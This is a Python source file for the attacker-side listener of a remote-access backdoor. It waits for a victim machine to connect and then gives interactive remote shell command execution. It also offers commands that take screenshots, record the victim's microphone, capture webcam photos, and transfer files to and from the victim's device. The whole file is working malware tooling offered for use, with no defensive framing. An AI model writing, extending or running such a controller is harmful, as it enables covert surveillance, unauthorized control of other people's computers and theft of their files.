import socket
from termcolor import colored
import argparse,subprocess,os
from datetime import datetime
import json
import base64
from time import sleep

class Listener():
    def __init__(self, port, host, bufferSize=1024*256):
        self.port = port
        self.host = host
        self.bufferSize = bufferSize
        self.create_socket()

    def create_socket(self):
        """creates a socket and gets the client connection ! """
        try:
            # Creating the socket object
            self.s = socket.socket()
            # Binding , combining the socket object with ip and port , it takes tuple as input
            self.s.bind((self.host, self.port))
            # let's listen for incoming connections , what is 5 , means we will try for 5 times , means if a error occurs when victim connects to this , then it will listen for 5 faulty connections and will stop listening after that !
            self.s.listen(5)
            print("-"*50)
            print(colored(f"[+] Listening on {self.host}:{self.port}", 'green', attrs=['bold']))
            print("-"*50)
            # After connection gets accepted , we  get a tuple with two elemets inside it , element at index 0 is the object through which we will do send commands and recieve output and at the other index , there is tuple with client ip and port !
            # It looks like this
            # (<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 1337), raddr=('127.0.0.1', 39968)>, ('127.0.0.1', 39968))
            self.client_con, self.client_info = self.s.accept()
            print(f'\n[+] Recieved a connection from {self.client_info[0]}:{self.client_info[1]}')
            # Sending commands to the host
            self.send_commands()

        except socket.error as err:
            print(colored(f"[-] Error occured at socket processing, Reason {err}", 'red'))
            
    
    
    def send_commands(self):
        # before recieving and sending commands,we will accept current workking directory and the username of the victim client to make a terminal look good
        cwd,whoami=self.reliable_recv()
        if os.name == 'nt':
            # for clearing the terminal !
            subprocess.run('cls', shell=True)
        else:
            subprocess.run('clear', shell=True)  
        while True:
            try:
                cmd=self.beautify_terminal_take_command(whoami=whoami,cwd=cwd)
                if len(cmd)>0:
                    cmd_lower=cmd.lower()
                    cmd_split_lower=cmd.lower().split()
                    if cmd_lower=='quit':
                        print("\nGood Bye !")   
                        self.reliable_send(cmd_lower)
                        self.client_con.close()
                        self.s.close()
                        exit()
                        
                    elif cmd_lower=='help':
                        print("Backdoor Supports These Functions ^_^")
                        print(colored("""• screenshot => Takes victim's screenshot\n• record_audio => Records 10 sec voice from victim's device\n• webcam_shot => Takes photo of your victim's device\n•download filename => download files\n•upload filename => upload files """,'magenta',attrs=['dark'])) 
                        
                    elif cmd_split_lower[0]=='download':
                        self.reliable_send(cmd)
                        self.recieve_file()
                        results,cwd,whoami=self.reliable_recv()
                        if self.checkresult(results):
                            print(colored(results, attrs=['dark']))
                            continue
                        else:
                            continue
                    elif cmd_split_lower[0]=='upload':
                        self.reliable_send(cmd)
                        self.send_file(cmd.split("upload")[1].strip())
                        results,cwd,whoami=self.reliable_recv()
                        if self.checkresult(results):
                            print(colored(results, attrs=['dark']))
                            continue
                        else:
                            continue
                    elif cmd_split_lower[0]=="record_audio":
                        self.reliable_send(cmd)
                        print(colored("[+] Recording voice from Victim's mic of 10 secs.....! Wait 10 secs",'yellow',attrs=['dark']))
                        sleep(9)
                        self.recieve_file(additonal_path='recordings')
                        results,cwd,whoami=self.reliable_recv()                        
                        if self.checkresult(results):
                            print(colored(results, attrs=['dark']))
                            continue
                        else:
                            continue
                    elif cmd_split_lower[0]=='webcam_shot':
                        self.reliable_send(cmd)
                        print(colored("[+] Recording Webcam_Shot From Webcam device",'yellow',attrs=['dark']))
                        sleep(3)
                        self.recieve_file(additonal_path='webcamshots')
                        results,cwd,whoami=self.reliable_recv()                        
                        if self.checkresult(results):
                            print(colored(results, attrs=['dark']))
                            continue
                        else:
                            continue
                        
                    elif cmd_lower=='screenshot':
                        self.reliable_send(cmd)
                        self.recieve_file(additonal_path='screenshots')
                        results,cwd,whoami=self.reliable_recv()                        
                        if self.checkresult(results):
                            print(colored(results, attrs=['dark']))
                            continue
                        else:
                            continue
                    else:
                        self.reliable_send(cmd)
                        results,cwd,whoami=self.reliable_recv()
                        print(colored(results, attrs=['dark']))
                else:
                    continue
            except Exception:
                print(colored("[-] Error during command execution!", 'red',attrs=['dark']))
                
    def checkresult(self,result):
        if result and 'Error' in result:
            return True
        else:
            return False
                
            
    def recieve_file(self,additonal_path=None):
        """Recieves file """
        response,filesize,filename=self.reliable_recv()
        if not 'Error' in response:
            filesize=int(filesize)
            if filesize>0:
                print('\n'+response)
                dir="Victim's Files"
                if additonal_path:
                    dir=dir+'/'+additonal_path
                content=self.reliable_recv()
                self.write_file(dir,content,filename)
                print(colored("\n[+] File Transfered !",'yellow',attrs=['dark']))
            else:
                print(colored(f"[-]{response}",'red',attrs=['dark']))
        else:
            print(filesize)    
    def send_file(self,file_path):
        """Sends the file to the victim device """
        sleep(0.5)
        if os.path.exists(file_path):
            file_size=os.path.getsize(file_path)
            file_name=os.path.basename(file_path)
            if int(file_size)>0:
                print(f"\n[+] Sending {file_name} to victim's device ...\n File size:{file_size}")
                data=[file_size,file_name]
                self.reliable_send(data)
                file_data=self.read_file(file_path)
                self.reliable_send(file_data)
                print(colored("\n[+] File Transfered !",'yellow',attrs=['dark']))
                sleep(2)
            else:
                print(colored(f"[-] {file_name} is empty",'red',attrs=['dark']))
                data=[file_size,file_name]
                self.reliable_send(data)
        else:
            print("Please provide a valid path ")
            file_size,file_name=0,None
            data=[file_size,file_name]
            self.reliable_send(data)
                        
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.client_con.send(json_data.encode())
        
    def read_file(self,path):
        """Reads data from the file and converts into base64 encoding and returns the data"""
        with open(path,'rb') as f:
            binary_file_data = f.read()
            base64_encoded_data = base64.b64encode(binary_file_data)
            base64_message = base64_encoded_data.decode('utf-8')
            return base64_message
        
    def write_file(self,path,content,file_name):     
        """Writes the base decoded data into the file """   
        if not os.path.exists(path):
                os.mkdir(path)
        base64_img_bytes = content.encode('utf-8')
        with open(f"{path}/{file_name}",'wb') as f:
            decoded_image_data = base64.decodebytes(base64_img_bytes)
            f.write(decoded_image_data)
    def reliable_recv(self):
        """Reliably recieves the data and and convert it back to its original form """
        json_data=""
        while True:
            try:
                json_data=json_data+self.client_con.recv(self.bufferSize).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def beautify_terminal_take_command(self, whoami, cwd):
        """Beautifies the terminal and take commamnds and send to the main function"""
        print(colored(f"👤 {whoami} on ", 'green', attrs=['bold']), end="")
        print(colored(f"📁 [{cwd}]", 'blue', attrs=['dark']), end=" at ⏳ ")
        print(colored(f"[{datetime.now().strftime('%H:%M:%S')}]", 'magenta'))
        print(colored("# ", 'red'), end="")
        cmd = input().strip()
        return cmd
               
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', help="Port on which listen to ",
                        dest="port", default=1337, required=False, type=int)
    return parser.parse_args()


if __name__ == "__main__":
    arguments = get_args()
    port = arguments.port
    host = "0.0.0.0"
    server = Listener(port, host)
